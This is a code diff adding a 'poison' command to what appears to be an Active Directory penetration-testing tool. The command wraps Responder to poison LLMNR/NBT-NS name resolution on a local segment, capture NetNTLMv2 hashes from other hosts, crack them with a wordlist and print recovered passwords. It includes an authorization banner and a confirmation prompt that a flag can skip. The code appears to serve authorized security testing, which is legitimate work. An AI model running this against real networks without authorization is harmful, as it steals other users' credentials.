@@ -247,6 +247,96 @@ def cmd_scan(args) -> int:
     return 0
 
 
+_POISON_BANNER = (
+    "\n=====================================================================\n"
+    " REDNESS poison — LLMNR/NBT-NS/mDNS poisoning (NetNTLMv2 capture)\n"
+    " INTRUSIVE: affects OTHER hosts on the local segment. Authorized,\n"
+    " in-scope engagements only — assume written authorization exists.\n"
+    "=====================================================================\n"
+)
+
+
+def cmd_poison(args) -> int:
+    import time
+    import webbrowser
+
+    from .engines.responder import is_available
+    from .poison import run_poison
+
+    print(_POISON_BANNER)
+    if args.analyze:
+        print(f"[*] Analyze mode: passively observing '{args.iface}' — no poisoning.")
+    else:
+        print(f"[!] This ACTIVELY POISONS name resolution on '{args.iface}' and coerces")
+        print("    authentication from other hosts on this segment.")
+
+    if not is_available():
+        print("[!] Responder is not installed / not on PATH.")
+        print("    Install it on the Kali/Linux operator box:  sudo apt install responder")
+        print("    (or from https://github.com/lgandx/Responder)")
+        return 2
+
+    if not args.yes:
+        verb = "observe" if args.analyze else "poison"
+        resp = input(f"    Type YES to {verb} {args.iface} for {args.duration}s: ").strip()
+        if resp != "YES":
+            print("[*] Aborted.")
+            return 1
+
+    bus = None
+    server = None
+    if args.live:
+        from .events import default_bus
+        from .live import LiveServer
+        bus = default_bus
+        server = LiveServer(bus, host=args.host, port=args.port)
+        url = server.start()
+        print(f"[+] Live graph at {url}")
+        if not args.no_open:
+            webbrowser.open(url)
+        time.sleep(1.2)                       # let the browser connect before streaming
+
+    print(f"[*] Running Responder on {args.iface} for {args.duration}s (Ctrl+C to stop early)...")
+    report, crackres = run_poison(
+        args.iface, duration=args.duration, analyze=args.analyze, bus=bus,
+        engagement=args.engagement, loot_dir=args.loot_dir, wordlist=args.wordlist,
+    )
+
+    if crackres.creds:
+        print(f"[+] Captured {len(crackres.creds)} hash(es) -> {', '.join(crackres.loot_files)}")
+        if args.wordlist:
+            if not crackres.tool:
+                print("[!] --wordlist set but no hashcat/john on PATH (hashes saved to loot).")
+            elif crackres.cracked:
+                print(f"[+] Cracked {len(crackres.cracked)} credential(s) via {crackres.tool}:")
+                for c in crackres.cracked:
+                    print(f"    {c.account}:{c.password}")
+            else:
+                print(f"[*] {crackres.tool} ran but cracked nothing with this wordlist.")
+    else:
+        print("[*] No NetNTLMv2 hashes captured in this window.")
+
+    _print_summary(report)
+
+    if args.out:
+        docx_report.build(report, args.out)
+        print(f"[+] Report -> {args.out}")
+    if args.json:
+        with open(args.json, "w", encoding="utf-8") as fh:
+            fh.write(report.to_json())
+        print(f"[+] Findings JSON -> {args.json}")
+
+    if server:
+        print("[*] Live graph running. Ctrl+C to stop.")
+        try:
+            while True:
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print("\n[*] Stopping.")
+            server.stop()
+    return 0
+
+
 def main(argv=None) -> int:
     p = argparse.ArgumentParser(prog="redness", description="AD assessment orchestrator + reporter")
     sub = p.add_subparsers(dest="cmd", required=True)
@@ -288,6 +378,24 @@ def main(argv=None) -> int:
     sc.add_argument("--port", type=int, default=8765, help="live graph port")
     sc.add_argument("--no-open", action="store_true", help="don't auto-open the browser")
     sc.set_defaults(func=cmd_scan)
+
+    po = sub.add_parser("poison",
+                        help="LLMNR/NBT-NS poisoning to capture NetNTLMv2 (intrusive; opt-in)")
+    po.add_argument("--iface", required=True, help="interface to listen/poison on (e.g. eth0)")
+    po.add_argument("--duration", type=int, default=600, help="seconds to run (default 600)")
+    po.add_argument("--analyze", action="store_true",
+                    help="passive observe only (responder -A); no poisoning")
+    po.add_argument("--yes", action="store_true", help="skip the confirmation prompt (scripted use)")
+    po.add_argument("--engagement", default="REDNESS NetNTLMv2 capture")
+    po.add_argument("--wordlist", help="crack captured NetNTLMv2 hashes (needs hashcat/john)")
+    po.add_argument("--loot-dir", default="loot", help="where to write captured hashes / cracked creds")
+    po.add_argument("--out", help="write a .docx report to this path")
+    po.add_argument("--json", help="write findings JSON to this path")
+    po.add_argument("--live", action="store_true", help="stream to the live 3D graph")
+    po.add_argument("--host", default="127.0.0.1", help="live graph bind host")
+    po.add_argument("--port", type=int, default=8765, help="live graph port")
+    po.add_argument("--no-open", action="store_true", help="don't auto-open the browser")
+    po.set_defaults(func=cmd_poison)
 
     args = p.parse_args(argv)
     return args.func(args)
